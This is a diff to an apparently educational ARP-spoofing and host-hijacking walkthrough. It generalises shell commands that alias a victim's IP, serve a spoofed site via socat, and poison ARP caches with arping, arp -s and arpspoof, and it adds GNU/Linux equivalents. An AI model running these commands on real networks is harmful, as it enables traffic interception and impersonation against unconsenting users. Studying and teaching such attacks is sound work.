@@ -51,6 +51,8 @@ Don't forget to spoof your own hardware address first:
 ```sh
 # Some assumptions for this demo:
 VICTIM_IP=192.168.9.10
+VICTIM_mDNS=server.local
+INTERFACE=en0
 
 # Make a temporary directory to store our spoofed site.
 mkdir /tmp/hijack
@@ -70,14 +72,18 @@ su admin
 sudo socat TCP4-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8000
 
 # Find the IP address of the device we are going to impersonate.
-dns-sd -G v4 server.local # Resolve (via mDNS) the server's domain name.
+dns-sd -G v4 $VICTIM_mDNS # Resolve (via mDNS) the server's domain name.
+# GNU/Linux users will probably want to do:
+#avahi-resolve --name -4 $VICTIM_mDNS
 
 # Alias our own NIC to the IP address that we want to masquerade as.
 # NOTE: This is not necessary for an MITM, since we just need to pass
 # traffic back and forth between our two targets. However, as this is
 # demos a *hijack* rather than an MITM, we need to respond *as* the
 # target instead of passing traffic *to* the target.
-sudo ifconfig en0 ${VICTIM_IP}/24 alias
+sudo ifconfig $INTERFACE ${VICTIM_IP}/24 alias
+# GNU/Linux users will probably want to do this instead:
+#ip address add ${VICTIM_IP}/24 dev $INTERFACE
 
 # Let's take a closer look at the IP address in that command:
 #
@@ -101,28 +107,28 @@ sudo nmap -sn -PR $VICTIM_IP # Note `-PR` is default, so can be omitted.
 arp-scan $VICTIM_IP
 
 # We can also use the `arping` utility for a more surgical approach:
-sudo arping -c 1 -i en0 $VICTIM_IP
+sudo arping -c 1 -i $INTERFACE $VICTIM_IP
 
 # We should now have an entry in our local ARP table ("ARP cache"):
 arp -n $VICTIM_IP
 # GNU/Linux users will probably want to do this instead:
-#ip neighbour show 192.168.1.1
+#ip neighbour show $VICTIM_IP
 
 # To actually perform the attack (i.e., to lie about the MAC-to-IP
 # mapping to the network), we can configure our attack machine to
 # respond to ARP requests for the victim IP address with our own
 # NIC's MAC address. This will not *necessarily* work due to the fact
 # that the legitimate answer may come after our own, overriding it.
-sudo arp -s $VICTIM_IP auto pub only ifscope en0
+sudo arp -s $VICTIM_IP auto pub only ifscope $INTERFACE
 
 # NOTE: This is only currently easy on true UNIX, like BSD. Attempts
-# to publish a proxy arp entry on GNU/Linux requires a kernel tunable
-# (`net.ipv4.conf.$INTERFACE.proxy_arp`) and proper routing tables.
+# to publish a Proxy ARP entry on GNU/Linux requires a kernel tunable
+# (`net.ipv4.conf.${INTERFACE}.proxy_arp`) and proper routing tables.
 # If you really want to attempt this as a GNU/Linux user, you will
 # ulimately want to invoke a command such as the following after setting
 # up your IP routing tables appropriately. ("Appropriately" means what?)
 # Some guidance at http://linux-ip.net/html/tools-ip-neighbor.html
-#sudo arp -Ds 192.168.1.136 eth0 pub
+#sudo arp -Ds $VICTIM_IP $INTERFACE pub
 
 # To improve the liklihood of successfully poisoning the target's ARP cache,
 # we want to continuously broadcast the wrong information, repeatedly.
@@ -139,7 +145,7 @@ sudo arp -s $VICTIM_IP auto pub only ifscope en0
 # associated with the MAC address of the attacker; hence, ARP spoofing.
 
 # One way we could construct such an ARP packet manually is like so:
-sudo arping -i en0 -U -P -S $VICTIM_IP 0.0.0.0
+sudo arping -i $INTERFACE -U -P -S $VICTIM_IP 0.0.0.0
 
 # More simply, we can just use the `arpspoof` tool:
 arpspoof $VICTIM_IP
